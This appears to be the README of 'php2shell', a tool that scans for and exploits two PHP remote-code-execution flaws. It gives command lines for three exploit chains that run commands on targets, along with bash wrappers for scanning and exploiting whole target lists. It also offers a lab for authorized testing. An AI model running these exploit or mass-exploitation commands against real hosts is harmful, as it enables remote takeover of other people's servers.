# php2shell — Evidence-First PHP RCE Scanner

An evidence-first scanner for **CVE-2026-109618** (RCE via OOM corruption) and **CVE-2026-109619** (RCE via stale global state) in PHP.

## Affected PHP Versions

| CVE | Advisory | Fixed |
|---|---|---|
| CVE-2026-109618 | [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |
| CVE-2026-109619 | [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |

## Requirements

- Python 3.11+ (tested on 3.13)
- Standard library only — no pip dependencies
- Docker (optional, for `lab/matrix/` only)

## Installation

```bash
git clone https://github.com/gloryy2k/pppppp.git
cd pppppp
```

## Usage

The tool has **6 modes**, from passive to destructive:

### 1. Inventory (safe — GET only)

Fingerprint PHP version, SAPI, and patch status:

```bash
python php2shell_scanner_v4.py inventory https://target.example --out runs/inv
```

### 2. Probe (safe — low-impact)

Check if requests can reach PHP through the frontend/WAF:

```bash
python php2shell_scanner_v4.py probe https://target.example --out runs/probe
```

### 3. Prove (requires authorization)

Execute bounded OOM scenarios against a prepared lab target:

```bash
python php2shell_scanner_v4.py prove http://127.0.0.1:8080 \
    --scenario 618-S2 \
    --ack-authorised \
    --status-url http://127.0.0.1:8080/status.php \
    --health-url http://127.0.0.1:8080/status.php \
    --telemetry /var/log/php/error.log \
    --out runs/lab-prove
```

Available scenarios: `618-S1`, `618-S2`, `618-S3`, `618-S4`, `619-S1`, `619-S2`, `619-S3`

### 4. Exploit (destructive — requires authorization)

Send real exploit payloads and verify RCE via out-of-band callback:

```bash
# Chain A: session upload_progress + LFI
python php2shell_scanner_v4.py exploit http://127.0.0.1:8080 \
    --chain A --ack-authorised \
    --lfi-path '/page.php?page=' \
    --callback-port 0 \
    --command "id; uname -a" \
    --out runs/exploit-a

# Chain C: direct callback via upload_progress filename
python php2shell_scanner_v4.py exploit http://127.0.0.1:8080 \
    --chain C --ack-authorised \
    --lfi-path '/page.php?page=' \
    --callback-port 9999 \
    --command "id" \
    --out runs/exploit-c

# Chain B: deserialization gadget (requires operator-supplied POP chain)
python php2shell_scanner_v4.py exploit http://127.0.0.1:8080 \
    --chain B --ack-authorised \
    --gadget '<serialized_pop_chain>' \
    --canary-nonce P2SMYNONCE123456 \
    --callback-port 9999 \
    --out runs/exploit-b
```

### 5. Report (offline)

Rebuild findings from stored evidence without network:

```bash
python php2shell_scanner_v4.py report runs/exploit-a
```

### 6. Verify (offline)

Check SHA-256 integrity of every evidence artifact:

```bash
python php2shell_scanner_v4.py verify runs/exploit-a
```

## Exploit Chains

| Chain | Technique | CVE | Requirements |
|---|---|---|---|
| **A** | Session `upload_progress` injection + LFI | 109618 | `--lfi-path`, `session.upload_progress.enabled=1`, writable session path |
| **B** | Session deserialization gadget | 109619 | `--gadget` (POP chain), `--canary-nonce`, `--callback-port` |
| **C** | Direct callback via upload_progress filename | 109618 | `--lfi-path`, `--callback-port` |

RCE is confirmed **only** by an out-of-band callback with matching nonce and verified source IP. Response markers are never accepted as proof.

## Mass Scanning

The tool scans one target at a time. For multiple targets, use a wrapper script:

### Passive recon (inventory + probe)

```bash
#!/bin/bash
while IFS= read -r target; do
    target=$(echo "$target" | tr -d '\r' | xargs)
    [ -z "$target" ] && continue
    slug=$(echo "$target" | sed 's|[:/]|_|g')
    echo "[*] Probing: $target"
    python php2shell_scanner_v4.py probe "$target" \
        --json --out "runs/mass/${slug}" 2>/dev/null
    rc=$?
    if [ $rc -eq 1 ]; then
        echo "[!] PROOF STATUS: $target"
    fi
done < targets.txt
```

### Exploit (authorized targets only)

```bash
#!/bin/bash
# Format: target|lfi_path
# Example: http://10.0.0.1:8080|/page.php?page=
while IFS='|' read -r target lfi; do
    target=$(echo "$target" | xargs)
    lfi=$(echo "$lfi" | xargs)
    [ -z "$target" ] && continue
    slug=$(echo "$target" | sed 's|[:/]|_|g')
    echo "[*] Exploiting: $target (LFI: $lfi)"
    python php2shell_scanner_v4.py exploit "$target" \
        --chain A --ack-authorised \
        --lfi-path "$lfi" \
        --callback-port 0 \
        --command "id" \
        --json --out "runs/mass/${slug}-exploit" 2>/dev/null
done < targets_exploit.txt
```

### Parallel mass scan (with GNU parallel)

```bash
# Probe all targets, 10 concurrent
cat targets.txt | parallel -j10 \
    'python php2shell_scanner_v4.py probe {} --json --out runs/mass/{= s|[:/]|_|g =} 2>/dev/null'
```

### Aggregate results

```bash
# Find all targets with proof-level findings
for d in runs/mass/*/findings.json; do
    python -c "
import json, sys
with open('$d') as f:
    findings = json.load(f)['findings']
for f in findings:
    if f['status'] not in ('NOT_TESTED','INCONCLUSIVE','PREREQUISITE_OBSERVED'):
        print(f'{f[\"cve\"]}: {f[\"status\"]}  ({sys.argv[1]})')
" "$d" 2>/dev/null
done
```

## Exit Codes

| Code | Meaning |
|---|---|
| `0` | No proof-level status reached |
| `1` | Proof-level status or verified exploit callback |
| `2` | Validation/integrity error or bad invocation |
| `130` | Interrupted (Ctrl+C) |

## Scenarios

### CVE-2026-109618 (OOM → invalid state → RCE)

| ID | Technique | SAPI |
|---|---|---|
| `618-S1` | Chunked multipart without Content-Length bypasses `post_max_size` | mod_php, FPM, FrankenPHP, LSAPI |
| `618-S2` | 5000 headers in one multipart part → memory amplification | same |
| `618-S3` | Empty file controls + nested field names → array amplification | same |
| `618-S4` | Application-level OOM via fixture endpoint (lab only) | same |

### CVE-2026-109619 (stale global state → RCE)

| ID | Technique | SAPI |
|---|---|---|
| `619-S1` | Fatal backtrace producer + INI diagnostic consumer (lab only) | mod_php |
| `619-S2` | Multipart OOM producer + session upload-progress consumer | mod_php |
| `619-S3` | Application producer + upload-progress consumer (lab only) | FPM, FrankenPHP, LSAPI |

## Status Model

Each CVE has its own evidence ladder. No status is inferred from HTTP status codes, banners, or crashes alone.

### CVE-2026-109618 ladder

```
NOT_TESTED → INCONCLUSIVE → PREREQUISITE_OBSERVED → EXPOSED_BUILD
  → OOM_OBSERVED → AFFECTED_PATH_CONFIRMED → CODE_EXECUTION_CONFIRMED
```

### CVE-2026-109619 ladder

```
NOT_TESTED → INCONCLUSIVE → PREREQUISITE_OBSERVED → EXPOSED_BUILD
  → PRODUCER_OBSERVED → PRODUCER_CONSUMER_CORRELATED
  → STALE_STATE_CONFIRMED → CODE_EXECUTION_CONFIRMED
```

`PATCH_CONFIRMED` is separate — only from high-trust build/package evidence.

## Evidence Layout

```
runs/<run-id>/
├── manifest.json        # Run metadata and hash convention
├── evidence.jsonl       # Append-only evidence records
├── artifacts/           # Canonical JSON per evidence record (SHA-256 verified)
├── case.json            # Profile, scenario runs, environment
├── findings.json        # Per-CVE findings
└── report/
    ├── report.json
    ├── report.md
    ├── report.html
    └── findings.jsonl
```

## Lab Setup

A Docker lab is included for local testing:

```bash
cd lab
docker compose up -d    # Apache mod_php + nginx/FPM

# Test against the lab
python php2shell_scanner_v4.py exploit http://127.0.0.1:18080 \
    --chain A --ack-authorised \
    --lfi-path '/page.php?page=' \
    --callback-port 0 \
    --command "id" \
    --out runs/lab-test
```

A patched/unpatched comparison matrix is available in `lab/matrix/`:

```bash
python lab/matrix/run_matrix.py --ack-authorised
```

## Tests

```bash
python -m unittest discover -s tests -v
```

159 tests covering: version parsing, patch assessment, per-CVE backports, telemetry parsing, HTTP classification, schema validation, evidence integrity, assessor ladders, exploit chains, callback verification, and false-positive exclusions.

## Key Options Reference

| Option | Description |
|---|---|
| `--ack-authorised` | Required for prove/exploit: confirms written authorization |
| `--scenario <id>` | Scenario to execute (e.g., `618-S2`, `619`, `618`) |
| `--chain <A\|B\|C>` | Exploit chain to use |
| `--lfi-path <path>` | LFI path for chains A/C (e.g., `/page.php?page=`) |
| `--callback-port <port>` | Callback listener port (0 = auto, omit = disabled) |
| `--command <cmd>` | Command to execute on target (default: `id`) |
| `--status-url <url>` | Lab status endpoint for SAPI/worker verification |
| `--health-url <url>` | Health check URL |
| `--telemetry <file>` | Import PHP/nginx log for correlation (repeatable) |
| `--inventory-json <file>` | Operator build/package inventory |
| `--sapi <name>` | Declare SAPI (auto / mod_php / fpm / ...) |
| `--insecure` | Disable TLS verification |
| `--proxy <url>` | HTTP proxy (not available in exploit mode) |
| `--json` | Machine-readable JSON output |
| `--out <dir>` | Evidence output directory |
| `--allow-remote` | Allow exploit against public hosts |
| `--session-path <path>` | PHP session file prefix (default: `/tmp/sessions/sess_`) |
| `--exec-func <func>` | Preferred PHP exec function to try first |
| `--gadget <chain>` | Serialized POP chain for chain B |
| `--max-requests <n>` | Request budget |
| `--max-bytes <n>` | Byte budget |
| `--max-seconds <n>` | Time budget |

## Safety

- `inventory` and `probe` are read-only — no OOM payloads
- `prove` requires explicit `--ack-authorised` and `--scenario`, checks health before/after, stops on degradation
- `exploit` refuses public targets by default, enforces budgets, requires out-of-band callback for any RCE claim
- TLS verification is on by default
- HTTP 500/502/timeout/connection reset are never treated as crash evidence
- Response markers in exploit mode are never treated as code execution

## Documentation

- `PROOF_MODEL.md` — Evidence requirements for each status level
- `COVERAGE.md` — What is lab-proven vs. unverified
- `SCHEMA.md` — Evidence/report/finding data formats
- `LIMITATIONS.md` — Known limits and non-claims
- `MIGRATION.md` — Mapping from original scanner to v4

## Disclaimer

This tool is for **authorized security testing only**. Only test systems you own or have explicit written permission to test. The authors are not responsible for misuse.
